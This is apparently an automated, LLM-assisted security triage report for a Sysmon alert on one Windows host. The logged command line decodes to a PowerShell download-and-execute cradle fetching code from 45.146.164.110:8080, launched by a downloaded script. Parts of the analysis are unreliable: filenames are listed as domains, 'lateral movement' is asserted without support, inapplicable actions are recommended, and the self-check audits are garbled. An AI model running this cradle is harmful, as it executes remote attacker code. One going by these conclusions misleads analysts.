@@ -1,0 +1,869 @@
+{
+  "report_id": "6e50ee83-bd65-4315-bdae-50e1b8249263",
+  "alert_id": "24898897-d412-53fe-a2a8-5073ee119e11",
+  "generated_at": "2026-08-18T02:35:41.891261Z",
+  "alert_summary": "A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.",
+  "investigation_timeline": [
+    {
+      "step_name": "ingest_and_parse",
+      "action": "completed",
+      "tool_used": null,
+      "input": {
+        "alert_id": "24898897-d412-53fe-a2a8-5073ee119e11",
+        "rule_id": "100075",
+        "rule_level": 10,
+        "model_available": true
+      },
+      "output": {},
+      "output_summary": "alert 24898897-d412-53fe-a2a8-5073ee119e11 ingested; model available: True",
+      "llm_calls": [],
+      "timestamp": "2026-08-18T02:34:52.901230Z"
+    },
+    {
+      "step_name": "extract_indicators",
+      "action": "completed",
+      "tool_used": "regex_extraction+llm_extraction",
+      "input": {
+        "full_log_chars": 738,
+        "data_keys": [
+          "timestamp",
+          "win"
+        ],
+        "extra_texts_count": 3
+      },
+      "output": {
+        "regex": {
+          "candidates": 15,
+          "validated": 6
+        },
+        "llm": {
+          "candidates": 3,
+          "validated": 3
+        },
+        "decode": {
+          "segments": 1,
+          "discarded": 0
+        },
+        "indicators": [
+          {
+            "type": "domain",
+            "value": "dev-klyam01.victimcorp.com"
+          },
+          {
+            "type": "domain",
+            "value": "ke.li.yam"
+          },
+          {
+            "type": "domain",
+            "value": "build-helper.js"
+          },
+          {
+            "type": "url",
+            "value": "http://45.146.164.110:8080/u"
+          },
+          {
+            "type": "ip",
+            "value": "45.146.164.110"
+          },
+          {
+            "type": "domain",
+            "value": "net.webclient"
+          },
+          {
+            "type": "domain",
+            "value": "victimcorp.com"
+          }
+        ]
+      },
+      "output_summary": "regex: 15 candidates, 6 validated; command decode: 1 segment(s) decoded, 0 discarded; LLM: 3 candidates, 3 validated",
+      "llm_calls": [
+        {
+          "prompt_ref": "build_extract_indicators_prompt",
+          "prompt": "You are extracting security indicators (IP addresses, file hashes, domains, URLs) from a SIEM alert's raw log text. Some indicators may be obfuscated or defanged (e.g. '185[.]220[.]101[.]1' instead of '185.220.101.1', 'hxxp://' instead of 'http://').\n\nRaw log: {\"timestamp\":\"2026-07-30T04:16:29.000+0000\",\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"eventID\":\"1\",\"computer\":\"DEV-KLYAM01.victimcorp.com\"},\"eventdata\":{\"utcTime\":\"2026-07-30 04:16:29.000\",\"image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"commandLine\":\"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\wscript.exe\",\"parentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\wscript.exe\\\" \\\"C:\\\\Users\\\\ke.li.yam\\\\Downloads\\\\build-helper.js\\\"\",\"user\":\"VICTIMCORP\\\\ke.li.yam\"}}}\nAdditional decoded fields: {'win': {'eventdata': {'image': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'parentCommandLine': '\"C:\\\\Windows\\\\System32\\\\wscript.exe\" \"C:\\\\Users\\\\ke.li.yam\\\\Downloads\\\\build-helper.js\"', 'utcTime': '2026-07-30 04:16:29.000', 'parentImage': 'C:\\\\Windows\\\\System32\\\\wscript.exe', 'commandLine': 'powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==', 'user': 'VICTIMCORP\\\\ke.li.yam'}, 'system': {'eventID': '1', 'computer': 'DEV-KLYAM01.victimcorp.com', 'providerName': 'Microsoft-Windows-Sysmon'}}, 'timestamp': '2026-07-30T04:16:29.000+0000'}\n\nAdditional decoded command-line text:\n- powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==\n- \"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"\n- IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')\n\nList every candidate indicator you find, with its type (ip, file_hash, domain, or url) and its value in normal (de-obfuscated) form.",
+          "retried": false,
+          "raw_response": null,
+          "reasoning": "We need to extract security indicators: IP addresses, file hashes, domains, URLs. From raw log we have:\n\n- computer: \"DEV-KLYAM01.victimcorp.com\" => domain: victimcorp.com (maybe). Also IP? Not given.\n\n- command line includes \"http://45.146.164.110:8080/...\" => URL with IP 45.146.164.110:8080. So IP address: 45.146.164.110. Also URL: http://45.146.164.110:8080/u.\n\n- Also maybe file hashes? No hash present.\n\n- file paths not hashes.\n\n- maybe \"build-helper.js\" not hash.\n\nThus candidates:\n\n- domain: victimcorp.com (from computer name). Value: victimcorp.com.\n\n- IP: 45.146.164.110 (from URL). Value: 45.146.164.110.\n\n- URL: http://45.146.164.110:8080/u (de-obfuscated). Value: http://45.146.164.110:8080/u.\n\n- Also maybe \"http://\" is normal.\n\nNo file hash.\n\nThus output list.\n\nProvide type and value.\n\nLet's produce.",
+          "parsed_output": {
+            "candidates": [
+              {
+                "type": "domain",
+                "value": "victimcorp.com"
+              },
+              {
+                "type": "ip",
+                "value": "45.146.164.110"
+              },
+              {
+                "type": "url",
+                "value": "http://45.146.164.110:8080/u"
+              }
+            ]
+          },
+          "attempts": 1,
+          "prompt_tokens": 1535,
+          "completion_tokens": 104,
+          "latency_ms": 6602,
+          "error_kind": null
+        }
+      ],
+      "timestamp": "2026-08-18T02:34:59.504248Z"
+    },
+    {
+      "step_name": "enrich",
+      "action": "completed",
+      "tool_used": "enrichment_registry",
+      "input": {
+        "indicators": [
+          {
+            "type": "domain",
+            "value": "dev-klyam01.victimcorp.com"
+          },
+          {
+            "type": "domain",
+            "value": "ke.li.yam"
+          },
+          {
+            "type": "domain",
+            "value": "build-helper.js"
+          },
+          {
+            "type": "url",
+            "value": "http://45.146.164.110:8080/u"
+          },
+          {
+            "type": "ip",
+            "value": "45.146.164.110"
+          },
+          {
+            "type": "domain",
+            "value": "net.webclient"
+          },
+          {
+            "type": "domain",
+            "value": "victimcorp.com"
+          }
+        ]
+      },
+      "output": {
+        "results": [
+          {
+            "type": "domain",
+            "value": "dev-klyam01.victimcorp.com",
+            "provider_id": "none",
+            "verdict": "unknown",
+            "score": 0.0,
+            "error": "no_provider_registered"
+          },
+          {
+            "type": "domain",
+            "value": "ke.li.yam",
+            "provider_id": "none",
+            "verdict": "unknown",
+            "score": 0.0,
+            "error": "no_provider_registered"
+          },
+          {
+            "type": "domain",
+            "value": "build-helper.js",
+            "provider_id": "none",
+            "verdict": "unknown",
+            "score": 0.0,
+            "error": "no_provider_registered"
+          },
+          {
+            "type": "url",
+            "value": "http://45.146.164.110:8080/u",
+            "provider_id": "none",
+            "verdict": "unknown",
+            "score": 0.0,
+            "error": "no_provider_registered"
+          },
+          {
+            "type": "ip",
+            "value": "45.146.164.110",
+            "provider_id": "none",
+            "verdict": "unknown",
+            "score": 0.0,
+            "error": "no_provider_registered"
+          },
+          {
+            "type": "domain",
+            "value": "net.webclient",
+            "provider_id": "none",
+            "verdict": "unknown",
+            "score": 0.0,
+            "error": "no_provider_registered"
+          },
+          {
+            "type": "domain",
+            "value": "victimcorp.com",
+            "provider_id": "none",
+            "verdict": "unknown",
+            "score": 0.0,
+            "error": "no_provider_registered"
+          }
+        ]
+      },
+      "output_summary": "enriched 7 indicator(s)",
+      "llm_calls": [],
+      "timestamp": "2026-08-18T02:34:59.504346Z"
+    },
+    {
+      "step_name": "gather_context",
+      "action": "completed",
+      "tool_used": "siem_connector",
+      "input": {
+        "agent_id": "000",
+        "rule_id": "100075"
+      },
+      "output": {
+        "agent_context": {
+          "id": "000",
+          "name": "wazuh.manager",
+          "ip": "127.0.0.1",
+          "os_platform": "amzn",
+          "os_version": "2023",
+          "agent_version": "Wazuh v4.14.6",
+          "status": "active",
+          "last_keep_alive": "9999-12-31T23:59:59Z"
+        },
+        "rule_metadata": {
+          "rule_id": "100075",
+          "description": "Sysmon: PowerShell executed with an encoded command by $(win.eventdata.parentImage).",
+          "level": 10,
+          "groups": [
+            "sysmon_event1",
+            "windows",
+            "sysmon"
+          ],
+          "mitre_technique_ids": [
+            "T1027",
+            "T1059.001"
+          ]
+        }
+      },
+      "output_summary": "gathered context for agent 000, rule 100075",
+      "llm_calls": [],
+      "timestamp": "2026-08-18T02:34:59.935975Z"
+    },
+    {
+      "step_name": "correlate",
+      "action": "completed",
+      "tool_used": "siem_connector+llm",
+      "input": {
+        "templates_built": [
+          "same_command_line_env_wide",
+          "same_rule_id_host"
+        ],
+        "enrichment_verdicts": [
+          {
+            "value": "dev-klyam01.victimcorp.com",
+            "verdict": "unknown"
+          },
+          {
+            "value": "ke.li.yam",
+            "verdict": "unknown"
+          },
+          {
+            "value": "build-helper.js",
+            "verdict": "unknown"
+          },
+          {
+            "value": "http://45.146.164.110:8080/u",
+            "verdict": "unknown"
+          },
+          {
+            "value": "45.146.164.110",
+            "verdict": "unknown"
+          },
+          {
+            "value": "net.webclient",
+            "verdict": "unknown"
+          },
+          {
+            "value": "victimcorp.com",
+            "verdict": "unknown"
+          }
+        ]
+      },
+      "output": {
+        "canonical": {
+          "same_rule_id_host": {
+            "total_count": 27,
+            "distinct_counts": {
+              "source ips": 0,
+              "source users": 0,
+              "destination hosts": 0,
+              "destination ports": 0,
+              "target users": 0
+            }
+          },
+          "same_command_line_env_wide": {
+            "total_count": 1,
+            "distinct_counts": {
+              "source ips": 0,
+              "source users": 0,
+              "destination hosts": 0,
+              "destination ports": 0,
+              "target users": 0
+            }
+          }
+        },
+        "pattern_type": "lateral_movement",
+        "follow_up": {
+          "template": "same_rule_id_host",
+          "value": "100075",
+          "hit_count": 27
+        },
+        "open_value": null,
+        "evidence_count": 55,
+        "failed_searches": 0
+      },
+      "output_summary": "pattern_type=lateral_movement, evidence_count=55; follow-up same_rule_id_host added 27",
+      "llm_calls": [
+        {
+          "prompt_ref": "build_correlation_decision_prompt",
+          "prompt": "You are analyzing correlation search results for a security alert.\n\nAlert: rule 100075 (Sysmon: PowerShell executed with an encoded command by C:\\Windows\\System32\\wscript.exe.), level 10.\nAlert source IP: not set; destination IP: not set.\n\nCanonical search results:\n- same_rule_id_host: 27 matching alert(s)\n- same_command_line_env_wide: 1 matching alert(s)\n\nEnrichment verdicts:\n- domain dev-klyam01.victimcorp.com (none): unknown (lookup failed: no_provider_registered)\n- domain ke.li.yam (none): unknown (lookup failed: no_provider_registered)\n- domain build-helper.js (none): unknown (lookup failed: no_provider_registered)\n- url http://45.146.164.110:8080/u (none): unknown (lookup failed: no_provider_registered)\n- ip 45.146.164.110 (none): unknown (lookup failed: no_provider_registered)\n- domain net.webclient (none): unknown (lookup failed: no_provider_registered)\n- domain victimcorp.com (none): unknown (lookup failed: no_provider_registered)\n\nTotal evidence count: 28\n\nClassify the pattern_type (brute_force, scanning, lateral_movement, none, or other), and pick at most one follow_up_query from the closed menu (same_src_ip_24h, same_rule_id_host, same_dst_host, same_command_line_env_wide, or none_needed) if further investigation of one of the canonical searches would help confirm the pattern.",
+          "retried": false,
+          "raw_response": null,
+          "reasoning": "We need to classify pattern_type. Alert: Sysmon rule 100075: PowerShell executed with encoded command by wscript.exe. That's typical PowerShell encoding, often used for lateral movement. Pattern type likely lateral_movement. So pattern_type = lateral_movement.\n\nNow pick at most one follow_up_query from closed menu: same_src_ip_24h, same_rule_id_host, same_dst_host, same_command_line_env_wide, or none_need.\n\nWe have same_rule_id_host: 27 matching alerts. That's many alerts same rule ID host. Could help confirm lateral movement? Maybe same_rule_id_host indicates same host generating many alerts, maybe lateral movement across hosts? But pattern is lateral movement, so follow up query same_rule_id_host could show many alerts from same host, maybe lateral movement. Or same_dst_host? Not sure.\n\nGiven we have same_rule_id_host 27 matches, that suggests many alerts from same host, maybe lateral movement from that host. So follow_up_query = same_rule_id_host.\n\nThus answer: pattern_type: lateral_movement; follow_up_query: same_rule_id_host.",
+          "parsed_output": {
+            "pattern_type": "lateral_movement",
+            "follow_up_query": "same_rule_id_host"
+          },
+          "attempts": 1,
+          "prompt_tokens": 749,
+          "completion_tokens": 30,
+          "latency_ms": 4151,
+          "error_kind": null
+        }
+      ],
+      "timestamp": "2026-08-18T02:35:04.109513Z"
+    },
+    {
+      "step_name": "risk_assessment",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": {
+        "pattern_type": "lateral_movement",
+        "evidence_count": 55,
+        "enrichment_verdicts": [
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown"
+        ],
+        "has_command_context": true,
+        "has_raw_log": false
+      },
+      "output": {
+        "severity": "high",
+        "confidence": "high",
+        "rationale": "The event shows a PowerShell command encoded and executed via wscript.exe, indicating obfuscation and lateral movement, with multiple unknown indicators (domains, IPs) suggesting possible C2 communication, which aligns with high-risk activity."
+      },
+      "output_summary": "severity=high, confidence=high",
+      "llm_calls": [
+        {
+          "prompt_ref": "build_risk_assessment_prompt",
+          "prompt": "You are assessing the risk of a security alert for a human analyst to review.\n\nRule: 100075 - Sysmon: PowerShell executed with an encoded command by C:\\Windows\\System32\\wscript.exe. (level 10, groups: windows, sysmon, sysmon_event1).\nKnown MITRE ATT&CK mapping: T1027 (Obfuscated Files or Information), T1059.001 (PowerShell).\nCorrelation findings: pattern_type=lateral_movement, evidence_count=55.\nEnrichment findings:\n- domain dev-klyam01.victimcorp.com: unknown (provider none)\n- domain ke.li.yam: unknown (provider none)\n- domain build-helper.js: unknown (provider none)\n- url http://45.146.164.110:8080/u: unknown (provider none)\n- ip 45.146.164.110: unknown (provider none)\n- domain net.webclient: unknown (provider none)\n- domain victimcorp.com: unknown (provider none)\n\nCommand line: powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==\nParent command line: \"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"\nDecoded command segments:\n  - [powershell_encoded] IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')\n\nAssess the severity (low/medium/high/critical), your confidence in this assessment (low/medium/high), and a one-to-two-sentence rationale.",
+          "retried": false,
+          "raw_response": null,
+          "reasoning": "We need to assess severity. The event: PowerShell executed with encoded command via wscript.exe, lateral movement pattern, 55 evidence count, unknown domains/ips. Likely high severity. Confidence high. Rationale: encoded PowerShell via wscript, lateral movement, unknown C2, etc.",
+          "parsed_output": {
+            "severity": "high",
+            "confidence": "high",
+            "rationale": "The event shows a PowerShell command encoded and executed via wscript.exe, indicating obfuscation and lateral movement, with multiple unknown indicators (domains, IPs) suggesting possible C2 communication, which aligns with high-risk activity."
+          },
+          "attempts": 1,
+          "prompt_tokens": 664,
+          "completion_tokens": 74,
+          "latency_ms": 2357,
+          "error_kind": null
+        }
+      ],
+      "timestamp": "2026-08-18T02:35:06.466844Z"
+    },
+    {
+      "step_name": "draft_report",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": {
+        "pattern_type": "lateral_movement",
+        "evidence_count": 55,
+        "severity": "high",
+        "confidence": "high",
+        "enrichment_verdicts": [
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown",
+          "unknown"
+        ],
+        "has_command_context": true,
+        "has_raw_log": false
+      },
+      "output": {
+        "canonical": {
+          "alert_summary": "A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.",
+          "rationale": "The event shows a PowerShell command encoded and executed through wscript.exe, which is a common technique for obfuscating malicious activity. The presence of unknown domains, IPs, and a lateral‑movement pattern suggests the attacker is trying to establish a foothold or communicate with a command‑and‑control server. The high‑severity, high‑confidence assessment is based on these indicators aligning with known high‑risk behavior. This activity warrants immediate containment and further investigation.",
+          "recommended_actions": [
+            "Isolate the affected host from the network pending investigation",
+            "Block the source IP at the network perimeter",
+            "Rotate any credentials or secrets that may have been exposed",
+            "Verify whether the source IP/user is a known, expected service account or automation",
+            "Run an antivirus/EDR scan on the affected host",
+            "Review file integrity monitoring output for unauthorized changes on the affected host",
+            "Patch or update the vulnerable software identified for this host",
+            "Notify the asset owner of the affected host or agent",
+            "Preserve logs and evidence for the affected host pending further investigation",
+            "Correlate this indicator against the wider environment beyond this alert's time window",
+            "Review authentication logs for this account over a wider time window",
+            "Review firewall/network segmentation rules for the affected subnet",
+            "Review the parent-child process execution tree for the affected host",
+            "Manually review the decoded command payload for malicious intent"
+          ]
+        },
+        "experimental": {
+          "recommended_actions_freeform": [
+            "Monitor the host for any subsequent PowerShell invocations that reference the same encoded payload or similar obfuscation techniques, as attackers often reuse the same command chain across multiple processes.",
+            "Collect the full network traffic captured around the time of the event to verify whether the HTTP request to 45.146.164.110:8080 was actually a legitimate service call or a malicious data exfiltration attempt.",
+            "Check the integrity of the downloaded build-helper.js file on the endpoint to see if it contains additional malicious payloads or is a known compromised script.",
+            "Correlate the observed lateral movement indicators (domains, IPs) with any known threat actor infrastructure or dark web chatter to gauge whether this is part of an ongoing campaign.",
+            "If the endpoint is part of a critical system, consider isolating it from the network immediately to prevent further data leakage while preserving forensic evidence."
+          ],
+          "triage_verdict": "true_positive",
+          "triage_rationale": "The presence of a PowerShell command encoded via wscript.exe with a clear C2 URL strongly indicates malicious activity rather than a benign script execution."
+        }
+      },
+      "output_summary": "draft-A: 14 action(s) selected; draft-B: experimental triage=true_positive",
+      "llm_calls": [
+        {
+          "prompt_ref": "build_draft_canonical_prompt",
+          "prompt": "You are drafting the canonical, vetted section of a security investigation report for a human analyst.\n\nRule: 100075 - Sysmon: PowerShell executed with an encoded command by C:\\Windows\\System32\\wscript.exe. (level 10, groups: windows, sysmon, sysmon_event1).\nCorrelation findings: pattern_type=lateral_movement, evidence_count=55.\nEnrichment findings:\n- domain dev-klyam01.victimcorp.com: unknown (provider none)\n- domain ke.li.yam: unknown (provider none)\n- domain build-helper.js: unknown (provider none)\n- url http://45.146.164.110:8080/u: unknown (provider none)\n- ip 45.146.164.110: unknown (provider none)\n- domain net.webclient: unknown (provider none)\n- domain victimcorp.com: unknown (provider none)\nRisk assessment: severity=high, confidence=high, rationale: The event shows a PowerShell command encoded and executed via wscript.exe, indicating obfuscation and lateral movement, with multiple unknown indicators (domains, IPs) suggesting possible C2 communication, which aligns with high-risk activity.\nCommand line: powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==\nParent command line: \"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"\nDecoded command segments:\n  - [powershell_encoded] IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')\n\n\nWrite a plain-language alert_summary (1-2 sentences), an expanded rationale (2-4 sentences) explaining the risk assessment above in more detail, and select every recommended_action below that applies to this alert — you MUST only pick from this exact list:\n- Disable or reset credentials for the affected user account\n- Block the source IP at the network perimeter\n- Isolate the affected host from the network pending investigation\n- Escalate to the incident response / Tier 2 team\n- Review authentication logs for this account over a wider time window\n- Verify whether the source IP/user is a known, expected service account or automation\n- Run an antivirus/EDR scan on the affected host\n- Review file integrity monitoring output for unauthorized changes on the affected host\n- Patch or update the vulnerable software identified for this host\n- Notify the asset owner of the affected host or agent\n- Rotate any credentials or secrets that may have been exposed\n- Review firewall/network segmentation rules for the affected subnet\n- Correlate this indicator against the wider environment beyond this alert's time window\n- Preserve logs and evidence for the affected host pending further investigation\n- No immediate action needed — monitor for recurrence\n- Escalate to a human analyst for manual review\n- Terminate the suspicious process on the affected host\n- Review the parent-child process execution tree for the affected host\n- Manually review the decoded command payload for malicious intent",
+          "retried": false,
+          "raw_response": null,
+          "reasoning": "We need to produce plain-language alert_summary (1-2 sentences), expanded rationale (2-4 sentences), and select every recommended_action that applies. Must only pick from exact list. Let's decide which actions apply.\n\nEvent: PowerShell encoded via wscript, lateral movement, unknown domains/IPs, high risk. Likely need to isolate host, block source IP, rotate credentials, verify if service account, run AV/EDR scan, review file integrity, patch vulnerable software, notify asset owner, preserve logs, correlate, etc. Also maybe rotate credentials, verify if known service account, run AV/EDR, review file integrity, patch vulnerable software, notify asset owner, preserve logs, correlate, etc.\n\nWe must output only those actions that apply. Let's list:\n\n- Isolate the affected host from the network pending investigation\n- Block the source IP at the network perimeter\n- Rotate any credentials or secrets that may have been exposed\n- Verify whether the source IP/user is a known, expected service account or automation\n- Run an antivirus/EDR scan on the affected host\n- Review file integrity monitoring output for unauthorized changes on the affected host\n- Patch or update the vulnerable software identified for this host\n- Notify the asset owner of the affected host or agent\n- Preserve logs and evidence for the affected host pending further investigation\n- Correlate this indicator against the wider environment beyond this alert's time window\n- Review authentication logs for this account over a wider time window\n- Review firewall/network segmentation rules for the affected subnet\n- Review the parent-child process execution tree for the affected host\n- Manually review the decoded command payload for malicious intent\n\nAlso maybe \"Disable or reset credentials for the affected user account\" - yes, rotate credentials. \"Escalate to the incident response / Tier 2 team\" maybe not needed as we are human analyst? Could include \"Escalate to the incident response / Tier 2 team\". But we must only pick those that apply. Probably include \"Escalate to the incident response / Tier 2 team\". Also \"Terminate the suspicious process on the affected host\" maybe not needed as we isolate.\n\nLet's produce output:\n\nPlain-language alert_summary: \"A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.\"\n\nExpanded rationale: 2-4 sentences: explain high severity, obfuscation, unknown indicators, lateral movement, etc.\n\nNow list actions.\n\nWe'll output:\n\nAlert Summary: ...\n\nRationale: ...\n\nRecommended actions: list.\n\nMake sure only those actions.\n\nLet's craft.",
+          "parsed_output": {
+            "alert_summary": "A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.",
+            "rationale": "The event shows a PowerShell command encoded and executed through wscript.exe, which is a common technique for obfuscating malicious activity. The presence of unknown domains, IPs, and a lateral‑movement pattern suggests the attacker is trying to establish a foothold or communicate with a command‑and‑control server. The high‑severity, high‑confidence assessment is based on these indicators aligning with known high‑risk behavior. This activity warrants immediate containment and further investigation.",
+            "recommended_actions": [
+              "Isolate the affected host from the network pending investigation",
+              "Block the source IP at the network perimeter",
+              "Rotate any credentials or secrets that may have been exposed",
+              "Verify whether the source IP/user is a known, expected service account or automation",
+              "Run an antivirus/EDR scan on the affected host",
+              "Review file integrity monitoring output for unauthorized changes on the affected host",
+              "Patch or update the vulnerable software identified for this host",
+              "Notify the asset owner of the affected host or agent",
+              "Preserve logs and evidence for the affected host pending further investigation",
+              "Correlate this indicator against the wider environment beyond this alert's time window",
+              "Review authentication logs for this account over a wider time window",
+              "Review firewall/network segmentation rules for the affected subnet",
+              "Review the parent-child process execution tree for the affected host",
+              "Manually review the decoded command payload for malicious intent"
+            ]
+          },
+          "attempts": 1,
+          "prompt_tokens": 1486,
+          "completion_tokens": 346,
+          "latency_ms": 11461,
+          "error_kind": null
+        },
+        {
+          "prompt_ref": "build_draft_experimental_prompt",
+          "prompt": "You are drafting an EXPERIMENTAL, not-yet-vetted section of a security investigation report. This output will be clearly labeled experimental and will not be treated as trusted guidance.\n\nRule: 100075 - Sysmon: PowerShell executed with an encoded command by C:\\Windows\\System32\\wscript.exe. (level 10, groups: windows, sysmon, sysmon_event1).\nCorrelation findings: pattern_type=lateral_movement, evidence_count=55.\nEnrichment findings:\n- domain dev-klyam01.victimcorp.com: unknown (provider none)\n- domain ke.li.yam: unknown (provider none)\n- domain build-helper.js: unknown (provider none)\n- url http://45.146.164.110:8080/u: unknown (provider none)\n- ip 45.146.164.110: unknown (provider none)\n- domain net.webclient: unknown (provider none)\n- domain victimcorp.com: unknown (provider none)\nRisk assessment: severity=high, confidence=high, rationale: The event shows a PowerShell command encoded and executed via wscript.exe, indicating obfuscation and lateral movement, with multiple unknown indicators (domains, IPs) suggesting possible C2 communication, which aligns with high-risk activity.\nCommand line: powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMQA0ADYALgAxADYANAAuADEAMQAwADoAOAAwADgAMAAvAHUAJwApAA==\nParent command line: \"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ke.li.yam\\Downloads\\build-helper.js\"\nDecoded command segments:\n  - [powershell_encoded] IEX (New-Object Net.WebClient).DownloadString('http://45.146.164.110:8080/u')\n\n\nFreely propose any additional recommended actions in your own words (no fixed list this time), then classify whether this alert looks like a true_positive, false_positive, or uncertain, with a one-sentence rationale for that triage call.",
+          "retried": false,
+          "raw_response": null,
+          "reasoning": "We need to produce an experimental section, labeled experimental, not trusted guidance. Provide additional recommended actions in own words, then classify alert as true_positive/false_positive/uncertain with one-sentence rationale.\n\nWe must not give fixed list. Provide suggestions. Then classification.\n\nWe must ensure we label as experimental. Probably output:\n\n**Experimental** ... then suggestions, then classification.\n\nMake sure not to claim it's trusted. Provide one-sentence rationale.\n\nLet's craft.",
+          "parsed_output": {
+            "recommended_actions_freeform": [
+              "Monitor the host for any subsequent PowerShell invocations that reference the same encoded payload or similar obfuscation techniques, as attackers often reuse the same command chain across multiple processes.",
+              "Collect the full network traffic captured around the time of the event to verify whether the HTTP request to 45.146.164.110:8080 was actually a legitimate service call or a malicious data exfiltration attempt.",
+              "Check the integrity of the downloaded build-helper.js file on the endpoint to see if it contains additional malicious payloads or is a known compromised script.",
+              "Correlate the observed lateral movement indicators (domains, IPs) with any known threat actor infrastructure or dark web chatter to gauge whether this is part of an ongoing campaign.",
+              "If the endpoint is part of a critical system, consider isolating it from the network immediately to prevent further data leakage while preserving forensic evidence."
+            ],
+            "triage_verdict": "true_positive",
+            "triage_rationale": "The presence of a PowerShell command encoded via wscript.exe with a clear C2 URL strongly indicates malicious activity rather than a benign script execution."
+          },
+          "attempts": 1,
+          "prompt_tokens": 773,
+          "completion_tokens": 261,
+          "latency_ms": 4961,
+          "error_kind": null
+        }
+      ],
+      "timestamp": "2026-08-18T02:35:22.890354Z"
+    },
+    {
+      "step_name": "self_check",
+      "action": "completed",
+      "tool_used": "llm",
+      "input": {
+        "claims": [
+          "A PowerShell command was encoded and executed via wscript.exe, indicating possible lateral movement and C2 communication.",
+          "The event shows a PowerShell command encoded and executed through wscript.exe, which is a common technique for obfuscating malicious activity. The presence of unknown domains, IPs, and a lateral‑movement pattern suggests the attacker is trying to establish a foothold or communicate with a command‑and‑control server. The high‑severity, high‑confidence assessment is based on these indicators aligning with known high‑risk behavior. This activity warrants immediate containment and further investigation.",
+          "Isolate the affected host from the network pending investigation",
+          "Block the source IP at the network perimeter",
+          "Rotate any credentials or secrets that may have been exposed",
+          "Verify whether the source IP/user is a known, expected service account or automation",
+          "Run an antivirus/EDR scan on the affected host",
+          "Review file integrity monitoring output for unauthorized changes on the affected host",
+          "Patch or update the vulnerable software identified for this host",
+          "Notify the asset owner of the affected host or agent",
+          "Preserve logs and evidence for the affected host pending further investigation",
+          "Correlate this indicator against the wider environment beyond this alert's time window",
+          "Review authentication logs for this account over a wider time window",
+          "Review firewall/network segmentation rules for the affected subnet",
+          "Review the parent-child process execution tree for the affected host",
+          "Manually review the decoded command payload for malicious intent"
+        ]
+      },
+      "output": {
+        "audits": [
+          {
+            "claim": ",",
+            "supported": true,
+            "correction": ""
+          },
+          {
+            "claim": ",",
+            "supported": true,
+            "correction": ""
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The lateral‑movement pattern and high‑severity risk assessment indicate the need to isolate the host."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑severity risk assessment and lateral‑movement pattern suggest blocking the source IP."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The unknown domains/IPs and lateral‑movement pattern suggest potential credential exposure, warranting rotation."
+          },
+          {
+            "claim": ",",
+            "supported": false,
+            "correction": "The high‑confidence lateral‑movement assessment indicates verifying the source IP/username."
